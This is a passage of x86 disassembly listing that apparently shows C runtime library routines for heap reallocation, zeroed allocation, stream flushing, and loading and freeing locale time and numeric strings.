  433f51:	dec    eax
  433f52:	mov    DWORD PTR [ebp-0x24],eax
  433f55:	cmp    eax,esi
  433f57:	jb     0x433f5b
  433f59:	mov    eax,esi
  433f5b:	push   eax
  433f5c:	push   edi
  433f5d:	push   DWORD PTR [ebp-0x1c]
  433f60:	call   0x42da10
  433f65:	push   edi
  433f66:	call   0x431564
  433f6b:	mov    DWORD PTR [ebp-0x20],eax
  433f6e:	push   edi
  433f6f:	push   eax
  433f70:	call   0x43158f
  433f75:	add    esp,0x18
  433f78:	cmp    DWORD PTR [ebp-0x1c],ebx
  433f7b:	jne    0x433fc8
  433f7d:	cmp    esi,ebx
  433f7f:	jne    0x433f87
  433f81:	xor    esi,esi
  433f83:	inc    esi
  433f84:	mov    DWORD PTR [ebp+0xc],esi
  433f87:	add    esi,0xf
  433f8a:	and    esi,0xfffffff0
  433f8d:	mov    DWORD PTR [ebp+0xc],esi
  433f90:	push   esi
  433f91:	push   ebx
  433f92:	push   DWORD PTR ds:0x465230
  433f98:	call   DWORD PTR ds:0x43900c
  433f9e:	mov    DWORD PTR [ebp-0x1c],eax
  433fa1:	cmp    eax,ebx
  433fa3:	je     0x433fc8
  433fa5:	mov    eax,DWORD PTR [edi-0x4]
  433fa8:	dec    eax
  433fa9:	mov    DWORD PTR [ebp-0x24],eax
  433fac:	cmp    eax,esi
  433fae:	jb     0x433fb2
  433fb0:	mov    eax,esi
  433fb2:	push   eax
  433fb3:	push   edi
  433fb4:	push   DWORD PTR [ebp-0x1c]
  433fb7:	call   0x42da10
  433fbc:	push   edi
  433fbd:	push   DWORD PTR [ebp-0x20]
  433fc0:	call   0x43158f
  433fc5:	add    esp,0x14
  433fc8:	or     DWORD PTR [ebp-0x4],0xffffffff
  433fcc:	call   0x434020
  433fd1:	cmp    DWORD PTR [ebp-0x20],ebx
  433fd4:	jne    0x433ff8
  433fd6:	cmp    esi,ebx
  433fd8:	jne    0x433fdd
  433fda:	xor    esi,esi
  433fdc:	inc    esi
  433fdd:	add    esi,0xf
  433fe0:	and    esi,0xfffffff0
  433fe3:	mov    DWORD PTR [ebp+0xc],esi
  433fe6:	push   esi
  433fe7:	push   edi
  433fe8:	push   ebx
  433fe9:	push   DWORD PTR ds:0x465230
  433fef:	call   DWORD PTR ds:0x439004
  433ff5:	mov    DWORD PTR [ebp-0x1c],eax
  433ff8:	mov    eax,DWORD PTR [ebp-0x1c]
  433ffb:	cmp    eax,ebx
  433ffd:	jne    0x43405f
  433fff:	cmp    DWORD PTR ds:0x43fea0,ebx
  434005:	je     0x43405f
  434007:	push   esi
  434008:	call   0x431365
  43400d:	pop    ecx
  43400e:	test   eax,eax
  434010:	jne    0x433efb
  434016:	jmp    0x43405d
  434018:	xor    ebx,ebx
  43401a:	mov    esi,DWORD PTR [ebp+0xc]
  43401d:	mov    edi,DWORD PTR [ebp+0x8]
  434020:	push   0x4
  434022:	call   0x431071
  434027:	pop    ecx
  434028:	ret    
  434029:	xor    eax,eax
  43402b:	cmp    esi,0xffffffe0
  43402e:	ja     0x434046
  434030:	cmp    esi,ebx
  434032:	jne    0x434037
  434034:	xor    esi,esi
  434036:	inc    esi
  434037:	push   esi
  434038:	push   edi
  434039:	push   ebx
  43403a:	push   DWORD PTR ds:0x465230
  434040:	call   DWORD PTR ds:0x439004
  434046:	cmp    eax,ebx
  434048:	jne    0x43405f
  43404a:	cmp    DWORD PTR ds:0x43fea0,ebx
  434050:	je     0x43405f
  434052:	push   esi
  434053:	call   0x431365
  434058:	pop    ecx
  434059:	test   eax,eax
  43405b:	jne    0x434029
  43405d:	xor    eax,eax
  43405f:	call   0x43124b
  434064:	ret    
  434065:	push   0x10
  434067:	push   0x43a3a0
  43406c:	call   0x431210
  434071:	cmp    DWORD PTR ds:0x465234,0x3
  434078:	jne    0x4340b4
  43407a:	push   0x4
  43407c:	call   0x431126
  434081:	pop    ecx
  434082:	and    DWORD PTR [ebp-0x4],0x0
  434086:	mov    esi,DWORD PTR [ebp+0x8]
  434089:	push   esi
  43408a:	call   0x431564
  43408f:	pop    ecx
  434090:	mov    DWORD PTR [ebp-0x20],eax
  434093:	test   eax,eax
  434095:	je     0x4340a2
  434097:	mov    esi,DWORD PTR [esi-0x4]
  43409a:	sub    esi,0x9
  43409d:	mov    DWORD PTR [ebp-0x1c],esi
  4340a0:	jmp    0x4340a5
  4340a2:	mov    esi,DWORD PTR [ebp-0x1c]
  4340a5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4340a9:	call   0x4340d2
  4340ae:	cmp    DWORD PTR [ebp-0x20],0x0
  4340b2:	jne    0x4340c7
  4340b4:	push   DWORD PTR [ebp+0x8]
  4340b7:	push   0x0
  4340b9:	push   DWORD PTR ds:0x465230
  4340bf:	call   DWORD PTR ds:0x43911c
  4340c5:	mov    esi,eax
  4340c7:	mov    eax,esi
  4340c9:	call   0x43124b
  4340ce:	ret    
  4340cf:	mov    esi,DWORD PTR [ebp-0x1c]
  4340d2:	push   0x4
  4340d4:	call   0x431071
  4340d9:	pop    ecx
  4340da:	ret    
  4340db:	push   0x10
  4340dd:	push   0x43a3b0
  4340e2:	call   0x431210
  4340e7:	mov    esi,DWORD PTR [ebp+0x8]
  4340ea:	imul   esi,DWORD PTR [ebp+0xc]
  4340ee:	mov    DWORD PTR [ebp-0x20],esi
  4340f1:	test   esi,esi
  4340f3:	jne    0x4340f6
  4340f5:	inc    esi
  4340f6:	xor    edi,edi
  4340f8:	mov    DWORD PTR [ebp-0x1c],edi
  4340fb:	cmp    esi,0xffffffe0
  4340fe:	ja     0x434165
  434100:	cmp    DWORD PTR ds:0x465234,0x3
  434107:	jne    0x434150
  434109:	add    esi,0xf
  43410c:	and    esi,0xfffffff0
  43410f:	mov    DWORD PTR [ebp+0xc],esi
  434112:	mov    ebx,DWORD PTR [ebp-0x20]
  434115:	cmp    ebx,DWORD PTR ds:0x465220
  43411b:	ja     0x434150
  43411d:	push   0x4
  43411f:	call   0x431126
  434124:	pop    ecx
  434125:	and    DWORD PTR [ebp-0x4],edi
  434128:	push   ebx
  434129:	call   0x431d43
  43412e:	pop    ecx
  43412f:	mov    DWORD PTR [ebp-0x1c],eax
  434132:	or     DWORD PTR [ebp-0x4],0xffffffff
  434136:	call   0x434185
  43413b:	mov    edi,DWORD PTR [ebp-0x1c]
  43413e:	test   edi,edi
  434140:	je     0x434154
  434142:	push   DWORD PTR [ebp-0x20]
  434145:	push   0x0
  434147:	push   edi
  434148:	call   0x42e4e0
  43414d:	add    esp,0xc
  434150:	test   edi,edi
  434152:	jne    0x43418e
  434154:	push   esi
  434155:	push   0x8
  434157:	push   DWORD PTR ds:0x465230
  43415d:	call   DWORD PTR ds:0x43900c
  434163:	mov    edi,eax
  434165:	test   edi,edi
  434167:	jne    0x43418e
  434169:	cmp    DWORD PTR ds:0x43fea0,edi
  43416f:	je     0x43418e
  434171:	push   esi
  434172:	call   0x431365
  434177:	pop    ecx
  434178:	test   eax,eax
  43417a:	jne    0x4340f6
  434180:	jmp    0x434190
  434182:	mov    esi,DWORD PTR [ebp+0xc]
  434185:	push   0x4
  434187:	call   0x431071
  43418c:	pop    ecx
  43418d:	ret    
  43418e:	mov    eax,edi
  434190:	call   0x43124b
  434195:	ret    
  434196:	push   0x10
  434198:	push   0x43a3c0
  43419d:	call   0x431210
  4341a2:	xor    ebx,ebx
  4341a4:	mov    DWORD PTR [ebp-0x1c],ebx
  4341a7:	push   0x1
  4341a9:	call   0x431126
  4341ae:	pop    ecx
  4341af:	mov    DWORD PTR [ebp-0x4],ebx
  4341b2:	push   0x3
  4341b4:	pop    edi
  4341b5:	mov    DWORD PTR [ebp-0x20],edi
  4341b8:	cmp    edi,DWORD PTR ds:0x466260
  4341be:	jge    0x434216
  4341c0:	mov    esi,edi
  4341c2:	shl    esi,0x2
  4341c5:	mov    eax,ds:0x465248
  4341ca:	mov    eax,DWORD PTR [esi+eax*1]
  4341cd:	cmp    eax,ebx
  4341cf:	je     0x434213
  4341d1:	test   BYTE PTR [eax+0xc],0x83
  4341d5:	je     0x4341e6
  4341d7:	push   eax
  4341d8:	call   0x42ea2e
  4341dd:	pop    ecx
  4341de:	cmp    eax,0xffffffff
  4341e1:	je     0x4341e6
  4341e3:	inc    DWORD PTR [ebp-0x1c]
  4341e6:	cmp    edi,0x14
  4341e9:	jl     0x434213
  4341eb:	mov    eax,ds:0x465248
  4341f0:	mov    eax,DWORD PTR [esi+eax*1]
  4341f3:	add    eax,0x20
  4341f6:	push   eax
  4341f7:	call   DWORD PTR ds:0x439084
  4341fd:	mov    eax,ds:0x465248
  434202:	push   DWORD PTR [esi+eax*1]
  434205:	call   0x42e0ed
  43420a:	pop    ecx
  43420b:	mov    eax,ds:0x465248
  434210:	mov    DWORD PTR [esi+eax*1],ebx
  434213:	inc    edi
  434214:	jmp    0x4341b5
  434216:	or     DWORD PTR [ebp-0x4],0xffffffff
  43421a:	call   0x434228
  43421f:	mov    eax,DWORD PTR [ebp-0x1c]
  434222:	call   0x43124b
  434227:	ret    
  434228:	push   0x1
  43422a:	call   0x431071
  43422f:	pop    ecx
  434230:	ret    
  434231:	push   ebp
  434232:	mov    ebp,esp
  434234:	push   ecx
  434235:	push   ecx
  434236:	test   esi,esi
  434238:	movzx  eax,WORD PTR ds:0x43fe8e
  43423f:	movzx  ecx,WORD PTR ds:0x43fe90
  434246:	mov    DWORD PTR [ebp-0x4],eax
  434249:	mov    DWORD PTR [ebp-0x8],ecx
  43424c:	jne    0x434253
  43424e:	or     eax,0xffffffff
  434251:	leave  
  434252:	ret    
  434253:	push   ebx
  434254:	push   edi
  434255:	lea    ecx,[esi+0x4]
  434258:	push   ecx
  434259:	push   0x31
  43425b:	xor    ebx,ebx
  43425d:	push   eax
  43425e:	inc    ebx
  43425f:	push   ebx
  434260:	call   0x435fc0
  434265:	mov    edi,eax
  434267:	lea    eax,[esi+0x8]
  43426a:	push   eax
  43426b:	push   0x32
  43426d:	push   DWORD PTR [ebp-0x4]
  434270:	push   ebx
  434271:	call   0x435fc0
  434276:	or     edi,eax
  434278:	lea    eax,[esi+0xc]
  43427b:	push   eax
  43427c:	push   0x33
  43427e:	push   DWORD PTR [ebp-0x4]
  434281:	push   ebx
  434282:	call   0x435fc0
  434287:	or     edi,eax
  434289:	lea    eax,[esi+0x10]
  43428c:	push   eax
  43428d:	push   0x34
  43428f:	push   DWORD PTR [ebp-0x4]
  434292:	push   ebx
  434293:	call   0x435fc0
  434298:	add    esp,0x40
  43429b:	or     edi,eax
  43429d:	lea    eax,[esi+0x14]
  4342a0:	push   eax
  4342a1:	push   0x35
  4342a3:	push   DWORD PTR [ebp-0x4]
  4342a6:	push   ebx
  4342a7:	call   0x435fc0
  4342ac:	or     edi,eax
  4342ae:	lea    eax,[esi+0x18]
  4342b1:	push   eax
  4342b2:	push   0x36
  4342b4:	push   DWORD PTR [ebp-0x4]
  4342b7:	push   ebx
  4342b8:	call   0x435fc0
  4342bd:	push   esi
  4342be:	push   0x37
  4342c0:	push   DWORD PTR [ebp-0x4]
  4342c3:	or     edi,eax
  4342c5:	push   ebx
  4342c6:	call   0x435fc0
  4342cb:	or     edi,eax
  4342cd:	lea    eax,[esi+0x20]
  4342d0:	push   eax
  4342d1:	push   0x2a
  4342d3:	push   DWORD PTR [ebp-0x4]
  4342d6:	push   ebx
  4342d7:	call   0x435fc0
  4342dc:	add    esp,0x40
  4342df:	or     edi,eax
  4342e1:	lea    eax,[esi+0x24]
  4342e4:	push   eax
  4342e5:	push   0x2b
  4342e7:	push   DWORD PTR [ebp-0x4]
  4342ea:	push   ebx
  4342eb:	call   0x435fc0
  4342f0:	or     edi,eax
  4342f2:	lea    eax,[esi+0x28]
  4342f5:	push   eax
  4342f6:	push   0x2c
  4342f8:	push   DWORD PTR [ebp-0x4]
  4342fb:	push   ebx
  4342fc:	call   0x435fc0
  434301:	or     edi,eax
  434303:	lea    eax,[esi+0x2c]
  434306:	push   eax
  434307:	push   0x2d
  434309:	push   DWORD PTR [ebp-0x4]
  43430c:	push   ebx
  43430d:	call   0x435fc0
  434312:	or     edi,eax
  434314:	lea    eax,[esi+0x30]
  434317:	push   eax
  434318:	push   0x2e
  43431a:	push   DWORD PTR [ebp-0x4]
  43431d:	push   ebx
  43431e:	call   0x435fc0
  434323:	add    esp,0x40
  434326:	or     edi,eax
  434328:	lea    eax,[esi+0x34]
  43432b:	push   eax
  43432c:	push   0x2f
  43432e:	push   DWORD PTR [ebp-0x4]
  434331:	push   ebx
  434332:	call   0x435fc0
  434337:	or     edi,eax
  434339:	lea    eax,[esi+0x1c]
  43433c:	push   eax
  43433d:	push   0x30
  43433f:	push   DWORD PTR [ebp-0x4]
  434342:	push   ebx
  434343:	call   0x435fc0
  434348:	or     edi,eax
  43434a:	lea    eax,[esi+0x38]
  43434d:	push   eax
  43434e:	push   0x44
  434350:	push   DWORD PTR [ebp-0x4]
  434353:	push   ebx
  434354:	call   0x435fc0
  434359:	or     edi,eax
  43435b:	lea    eax,[esi+0x3c]
  43435e:	push   eax
  43435f:	push   0x45
  434361:	push   DWORD PTR [ebp-0x4]
  434364:	push   ebx
  434365:	call   0x435fc0
  43436a:	add    esp,0x40
  43436d:	or     edi,eax
  43436f:	lea    eax,[esi+0x40]
  434372:	push   eax
  434373:	push   0x46
  434375:	push   DWORD PTR [ebp-0x4]
  434378:	push   ebx
  434379:	call   0x435fc0
  43437e:	or     edi,eax
  434380:	lea    eax,[esi+0x44]
  434383:	push   eax
  434384:	push   0x47
  434386:	push   DWORD PTR [ebp-0x4]
  434389:	push   ebx
  43438a:	call   0x435fc0
  43438f:	or     edi,eax
  434391:	lea    eax,[esi+0x48]
  434394:	push   eax
  434395:	push   0x48
  434397:	push   DWORD PTR [ebp-0x4]
  43439a:	push   ebx
  43439b:	call   0x435fc0
  4343a0:	or     edi,eax
  4343a2:	lea    eax,[esi+0x4c]
  4343a5:	push   eax
  4343a6:	push   0x49
  4343a8:	push   DWORD PTR [ebp-0x4]
  4343ab:	push   ebx
  4343ac:	call   0x435fc0
  4343b1:	add    esp,0x40
  4343b4:	or     edi,eax
  4343b6:	lea    eax,[esi+0x50]
  4343b9:	push   eax
  4343ba:	push   0x4a
  4343bc:	push   DWORD PTR [ebp-0x4]
  4343bf:	push   ebx
  4343c0:	call   0x435fc0
  4343c5:	or     edi,eax
  4343c7:	lea    eax,[esi+0x54]
  4343ca:	push   eax
  4343cb:	push   0x4b
  4343cd:	push   DWORD PTR [ebp-0x4]
  4343d0:	push   ebx
  4343d1:	call   0x435fc0
  4343d6:	or     edi,eax
  4343d8:	lea    eax,[esi+0x58]
  4343db:	push   eax
  4343dc:	push   0x4c
  4343de:	push   DWORD PTR [ebp-0x4]
  4343e1:	push   ebx
  4343e2:	call   0x435fc0
  4343e7:	or     edi,eax
  4343e9:	lea    eax,[esi+0x5c]
  4343ec:	push   eax
  4343ed:	push   0x4d
  4343ef:	push   DWORD PTR [ebp-0x4]
  4343f2:	push   ebx
  4343f3:	call   0x435fc0
  4343f8:	add    esp,0x40
  4343fb:	or     edi,eax
  4343fd:	lea    eax,[esi+0x60]
  434400:	push   eax
  434401:	push   0x4e
  434403:	push   DWORD PTR [ebp-0x4]
  434406:	push   ebx
  434407:	call   0x435fc0
  43440c:	or     edi,eax
  43440e:	lea    eax,[esi+0x64]
  434411:	push   eax
  434412:	push   0x4f
  434414:	push   DWORD PTR [ebp-0x4]
  434417:	push   ebx
  434418:	call   0x435fc0
  43441d:	or     edi,eax
  43441f:	lea    eax,[esi+0x68]
  434422:	push   eax
  434423:	push   0x38
  434425:	push   DWORD PTR [ebp-0x4]
  434428:	push   ebx
  434429:	call   0x435fc0
  43442e:	or     edi,eax
  434430:	lea    eax,[esi+0x6c]
  434433:	push   eax
  434434:	push   0x39
  434436:	push   DWORD PTR [ebp-0x4]
  434439:	push   ebx
  43443a:	call   0x435fc0
  43443f:	add    esp,0x40
  434442:	or     edi,eax
  434444:	lea    eax,[esi+0x70]
  434447:	push   eax
  434448:	push   0x3a
  43444a:	push   DWORD PTR [ebp-0x4]
  43444d:	push   ebx
  43444e:	call   0x435fc0
  434453:	or     edi,eax
  434455:	lea    eax,[esi+0x74]
  434458:	push   eax
  434459:	push   0x3b
  43445b:	push   DWORD PTR [ebp-0x4]
  43445e:	push   ebx
  43445f:	call   0x435fc0
  434464:	or     edi,eax
  434466:	lea    eax,[esi+0x78]
  434469:	push   eax
  43446a:	push   0x3c
  43446c:	push   DWORD PTR [ebp-0x4]
  43446f:	push   ebx
  434470:	call   0x435fc0
  434475:	or     edi,eax
  434477:	lea    eax,[esi+0x7c]
  43447a:	push   eax
  43447b:	push   0x3d
  43447d:	push   DWORD PTR [ebp-0x4]
  434480:	push   ebx
  434481:	call   0x435fc0
  434486:	add    esp,0x40
  434489:	or     edi,eax
  43448b:	lea    eax,[esi+0x80]
  434491:	push   eax
  434492:	push   0x3e
  434494:	push   DWORD PTR [ebp-0x4]
  434497:	push   ebx
  434498:	call   0x435fc0
  43449d:	or     edi,eax
  43449f:	lea    eax,[esi+0x84]
  4344a5:	push   eax
  4344a6:	push   0x3f
  4344a8:	push   DWORD PTR [ebp-0x4]
  4344ab:	push   ebx
  4344ac:	call   0x435fc0
  4344b1:	or     edi,eax
  4344b3:	lea    eax,[esi+0x88]
  4344b9:	push   eax
  4344ba:	push   0x40
  4344bc:	push   DWORD PTR [ebp-0x4]
  4344bf:	push   ebx
  4344c0:	call   0x435fc0
  4344c5:	or     edi,eax
  4344c7:	lea    eax,[esi+0x8c]
  4344cd:	push   eax
  4344ce:	push   0x41
  4344d0:	push   DWORD PTR [ebp-0x4]
  4344d3:	push   ebx
  4344d4:	call   0x435fc0
  4344d9:	add    esp,0x40
  4344dc:	or     edi,eax
  4344de:	lea    eax,[esi+0x90]
  4344e4:	push   eax
  4344e5:	push   0x42
  4344e7:	push   DWORD PTR [ebp-0x4]
  4344ea:	push   ebx
  4344eb:	call   0x435fc0
  4344f0:	or     edi,eax
  4344f2:	lea    eax,[esi+0x94]
  4344f8:	push   eax
  4344f9:	push   0x43
  4344fb:	push   DWORD PTR [ebp-0x4]
  4344fe:	push   ebx
  4344ff:	call   0x435fc0
  434504:	or     edi,eax
  434506:	lea    eax,[esi+0x98]
  43450c:	push   eax
  43450d:	push   0x28
  43450f:	push   DWORD PTR [ebp-0x4]
  434512:	push   ebx
  434513:	call   0x435fc0
  434518:	or     edi,eax
  43451a:	lea    eax,[esi+0x9c]
  434520:	push   eax
  434521:	push   0x29
  434523:	push   DWORD PTR [ebp-0x4]
  434526:	push   ebx
  434527:	call   0x435fc0
  43452c:	add    esp,0x40
  43452f:	or     edi,eax
  434531:	lea    eax,[esi+0xa0]
  434537:	push   eax
  434538:	push   0x1f
  43453a:	push   DWORD PTR [ebp-0x8]
  43453d:	push   ebx
  43453e:	call   0x435fc0
  434543:	or     edi,eax
  434545:	lea    eax,[esi+0xa4]
  43454b:	push   eax
  43454c:	push   0x20
  43454e:	push   DWORD PTR [ebp-0x8]
  434551:	push   ebx
  434552:	call   0x435fc0
  434557:	or     edi,eax
  434559:	lea    eax,[esi+0xa8]
  43455f:	push   eax
  434560:	push   0x1003
  434565:	push   DWORD PTR [ebp-0x8]
  434568:	push   ebx
  434569:	call   0x435fc0
  43456e:	mov    ebx,DWORD PTR [ebp-0x8]
  434571:	or     edi,eax
  434573:	lea    eax,[esi+0xb0]
  434579:	push   eax
  43457a:	push   0x1009
  43457f:	push   ebx
  434580:	push   0x0
  434582:	call   0x435fc0
  434587:	add    esp,0x40
  43458a:	or     edi,eax
  43458c:	mov    DWORD PTR [esi+0xac],ebx
  434592:	mov    eax,edi
  434594:	pop    edi
  434595:	pop    ebx
  434596:	leave  
  434597:	ret    
  434598:	push   esi
  434599:	mov    esi,DWORD PTR [esp+0x8]
  43459d:	test   esi,esi
  43459f:	je     0x434726
  4345a5:	push   DWORD PTR [esi+0x4]
  4345a8:	call   0x42e0ed
  4345ad:	push   DWORD PTR [esi+0x8]
  4345b0:	call   0x42e0ed
  4345b5:	push   DWORD PTR [esi+0xc]
  4345b8:	call   0x42e0ed
  4345bd:	push   DWORD PTR [esi+0x10]
  4345c0:	call   0x42e0ed
  4345c5:	push   DWORD PTR [esi+0x14]
  4345c8:	call   0x42e0ed
  4345cd:	push   DWORD PTR [esi+0x18]
  4345d0:	call   0x42e0ed
  4345d5:	push   DWORD PTR [esi]
  4345d7:	call   0x42e0ed
  4345dc:	push   DWORD PTR [esi+0x20]
  4345df:	call   0x42e0ed
  4345e4:	push   DWORD PTR [esi+0x24]
  4345e7:	call   0x42e0ed
  4345ec:	push   DWORD PTR [esi+0x28]
  4345ef:	call   0x42e0ed
  4345f4:	push   DWORD PTR [esi+0x2c]
  4345f7:	call   0x42e0ed
  4345fc:	push   DWORD PTR [esi+0x30]
  4345ff:	call   0x42e0ed
  434604:	push   DWORD PTR [esi+0x34]
  434607:	call   0x42e0ed
  43460c:	push   DWORD PTR [esi+0x1c]
  43460f:	call   0x42e0ed
  434614:	push   DWORD PTR [esi+0x38]
  434617:	call   0x42e0ed
  43461c:	push   DWORD PTR [esi+0x3c]
  43461f:	call   0x42e0ed
  434624:	add    esp,0x40
  434627:	push   DWORD PTR [esi+0x40]
  43462a:	call   0x42e0ed
  43462f:	push   DWORD PTR [esi+0x44]
  434632:	call   0x42e0ed
  434637:	push   DWORD PTR [esi+0x48]
  43463a:	call   0x42e0ed
  43463f:	push   DWORD PTR [esi+0x4c]
  434642:	call   0x42e0ed
  434647:	push   DWORD PTR [esi+0x50]
  43464a:	call   0x42e0ed
  43464f:	push   DWORD PTR [esi+0x54]
  434652:	call   0x42e0ed
  434657:	push   DWORD PTR [esi+0x58]
  43465a:	call   0x42e0ed
  43465f:	push   DWORD PTR [esi+0x5c]
  434662:	call   0x42e0ed
  434667:	push   DWORD PTR [esi+0x60]
  43466a:	call   0x42e0ed
  43466f:	push   DWORD PTR [esi+0x64]
  434672:	call   0x42e0ed
  434677:	push   DWORD PTR [esi+0x68]
  43467a:	call   0x42e0ed
  43467f:	push   DWORD PTR [esi+0x6c]
  434682:	call   0x42e0ed
  434687:	push   DWORD PTR [esi+0x70]
  43468a:	call   0x42e0ed
  43468f:	push   DWORD PTR [esi+0x74]
  434692:	call   0x42e0ed
  434697:	push   DWORD PTR [esi+0x78]
  43469a:	call   0x42e0ed
  43469f:	push   DWORD PTR [esi+0x7c]
  4346a2:	call   0x42e0ed
  4346a7:	add    esp,0x40
  4346aa:	push   DWORD PTR [esi+0x80]
  4346b0:	call   0x42e0ed
  4346b5:	push   DWORD PTR [esi+0x84]
  4346bb:	call   0x42e0ed
  4346c0:	push   DWORD PTR [esi+0x88]
  4346c6:	call   0x42e0ed
  4346cb:	push   DWORD PTR [esi+0x8c]
  4346d1:	call   0x42e0ed
  4346d6:	push   DWORD PTR [esi+0x90]
  4346dc:	call   0x42e0ed
  4346e1:	push   DWORD PTR [esi+0x94]
  4346e7:	call   0x42e0ed
  4346ec:	push   DWORD PTR [esi+0x98]
  4346f2:	call   0x42e0ed
  4346f7:	push   DWORD PTR [esi+0x9c]
  4346fd:	call   0x42e0ed
  434702:	push   DWORD PTR [esi+0xa0]
  434708:	call   0x42e0ed
  43470d:	push   DWORD PTR [esi+0xa4]
  434713:	call   0x42e0ed
  434718:	push   DWORD PTR [esi+0xa8]
  43471e:	call   0x42e0ed
  434723:	add    esp,0x2c
  434726:	pop    esi
  434727:	ret    
  434728:	cmp    DWORD PTR ds:0x43fe60,0x0
  43472f:	push   esi
  434730:	je     0x434772
  434732:	push   0xb8
  434737:	push   0x1
  434739:	call   0x4340db
  43473e:	mov    esi,eax
  434740:	test   esi,esi
  434742:	pop    ecx
  434743:	pop    ecx
  434744:	jne    0x43474b
  434746:	xor    eax,eax
  434748:	inc    eax
  434749:	pop    esi
  43474a:	ret    
  43474b:	call   0x434231
  434750:	test   eax,eax
  434752:	je     0x434764
  434754:	push   esi
  434755:	call   0x434598
  43475a:	push   esi
  43475b:	call   0x42e0ed
  434760:	pop    ecx
  434761:	pop    ecx
  434762:	jmp    0x434746
  434764:	mov    DWORD PTR ds:0x43dc80,esi
  43476a:	mov    DWORD PTR ds:0x43fe20,esi
  434770:	jmp    0x434783
  434772:	and    DWORD PTR ds:0x43fe20,0x0
  434779:	mov    DWORD PTR ds:0x43dc80,0x43dc88
  434783:	xor    eax,eax
  434785:	pop    esi
  434786:	ret    
  434787:	push   esi
  434788:	mov    esi,DWORD PTR [esp+0x8]
  43478c:	test   esi,esi
  43478e:	je     0x4347e4
  434790:	mov    eax,DWORD PTR [esi]
  434792:	mov    ecx,DWORD PTR ds:0x43dd74
  434798:	cmp    eax,DWORD PTR [ecx]
  43479a:	je     0x4347ab
  43479c:	cmp    eax,DWORD PTR ds:0x43dd44
  4347a2:	je     0x4347ab
  4347a4:	push   eax
  4347a5:	call   0x42e0ed
  4347aa:	pop    ecx
  4347ab:	mov    eax,DWORD PTR [esi+0x4]
  4347ae:	mov    ecx,DWORD PTR ds:0x43dd74
  4347b4:	cmp    eax,DWORD PTR [ecx+0x4]
  4347b7:	je     0x4347c8
  4347b9:	cmp    eax,DWORD PTR ds:0x43dd48
  4347bf:	je     0x4347c8
  4347c1:	push   eax
  4347c2:	call   0x42e0ed
  4347c7:	pop    ecx
  4347c8:	mov    esi,DWORD PTR [esi+0x8]
  4347cb:	mov    eax,ds:0x43dd74
  4347d0:	cmp    esi,DWORD PTR [eax+0x8]
  4347d3:	je     0x4347e4
  4347d5:	cmp    esi,DWORD PTR ds:0x43dd4c
  4347db:	je     0x4347e4
  4347dd:	push   esi
  4347de:	call   0x42e0ed
  4347e3:	pop    ecx
  4347e4:	pop    esi
  4347e5:	ret    
  4347e6:	push   ebp
  4347e7:	mov    ebp,esp
  4347e9:	push   ecx
  4347ea:	push   ecx
  4347eb:	push   ebx
  4347ec:	push   esi
  4347ed:	xor    esi,esi
  4347ef:	cmp    DWORD PTR ds:0x43fe5c,esi
  4347f5:	push   edi
  4347f6:	jne    0x434847
  4347f8:	cmp    DWORD PTR ds:0x43fe58,esi
  4347fe:	jne    0x434847
  434800:	mov    eax,ds:0x4650e4
  434805:	cmp    eax,esi
  434807:	je     0x43482b
  434809:	cmp    DWORD PTR [eax],esi
  43480b:	jne    0x43482b
  43480d:	mov    ecx,DWORD PTR ds:0x43d6ec
  434813:	cmp    eax,DWORD PTR [ecx+0x2c]
  434816:	je     0x43482b
  434818:	push   eax
  434819:	call   0x42e0ed
  43481e:	push   DWORD PTR ds:0x43fe24
  434824:	call   0x42e0ed
  434829:	pop    ecx
  43482a:	pop    ecx
  43482b:	mov    DWORD PTR ds:0x4650e8,esi
  434831:	mov    DWORD PTR ds:0x4650e4,esi
  434837:	mov    ebx,0x43dd44
  43483c:	mov    DWORD PTR ds:0x43fe24,esi
  434842:	jmp    0x434993
  434847:	push   0x30
  434849:	push   0x1
  43484b:	call   0x4340db
  434850:	mov    ebx,eax
  434852:	cmp    ebx,esi
  434854:	pop    ecx
  434855:	pop    ecx
  434856:	je     0x43487d
  434858:	mov    esi,DWORD PTR ds:0x43dd74
  43485e:	push   0xc
  434860:	pop    ecx
  434861:	mov    edi,ebx
  434863:	push   0x4
  434865:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434867:	call   0x4311fe
  43486c:	xor    esi,esi
  43486e:	cmp    eax,esi
  434870:	pop    ecx
  434871:	mov    DWORD PTR [ebp-0x8],eax
  434874:	jne    0x434885
  434876:	push   ebx
  434877:	call   0x42e0ed
  43487c:	pop    ecx
  43487d:	xor    eax,eax
  43487f:	inc    eax
  434880:	jmp    0x4349ae
  434885:	mov    DWORD PTR [eax],esi
  434887:	cmp    DWORD PTR ds:0x43fe5c,esi
  43488d:	je     0x43493c
  434893:	push   0x4
  434895:	call   0x4311fe
  43489a:	cmp    eax,esi
  43489c:	pop    ecx
  43489d:	mov    ds:0x4650e8,eax
  4348a2:	jne    0x4348a9
  4348a4:	xor    esi,esi
  4348a6:	inc    esi
  4348a7:	jmp    0x4348f1
  4348a9:	mov    DWORD PTR [eax],esi
  4348ab:	movzx  esi,WORD PTR ds:0x43fe8a
  4348b2:	push   ebx
  4348b3:	push   0xe
  4348b5:	push   esi
  4348b6:	push   0x1
  4348b8:	call   0x435fc0
  4348bd:	mov    DWORD PTR [ebp-0x4],eax
  4348c0:	lea    eax,[ebx+0x4]
  4348c3:	push   eax
  4348c4:	push   0xf
  4348c6:	push   esi
  4348c7:	push   0x1
  4348c9:	call   0x435fc0
  4348ce:	or     DWORD PTR [ebp-0x4],eax
  4348d1:	lea    edi,[ebx+0x8]
  4348d4:	push   edi
  4348d5:	push   0x10
  4348d7:	push   esi
  4348d8:	push   0x1
  4348da:	call   0x435fc0
  4348df:	add    esp,0x30
  4348e2:	or     eax,DWORD PTR [ebp-0x4]
  4348e5:	je     0x434908
  4348e7:	push   ebx
  4348e8:	call   0x434787
  4348ed:	pop    ecx
  4348ee:	or     esi,0xffffffff
  4348f1:	push   ebx
  4348f2:	call   0x42e0ed
  4348f7:	push   DWORD PTR [ebp-0x8]
  4348fa:	call   0x42e0ed
  4348ff:	pop    ecx
  434900:	pop    ecx
  434901:	mov    eax,esi
  434903:	jmp    0x4349ae
  434908:	mov    eax,DWORD PTR [edi]
  43490a:	jmp    0x43491e
  43490c:	mov    cl,BYTE PTR [eax]
  43490e:	cmp    cl,0x30
  434911:	jl     0x434925
  434913:	cmp    cl,0x39
  434916:	jg     0x434925
  434918:	sub    cl,0x30
  43491b:	mov    BYTE PTR [eax],cl
  43491d:	inc    eax
  43491e:	cmp    BYTE PTR [eax],0x0
  434921:	jne    0x43490c
  434923:	jmp    0x434959
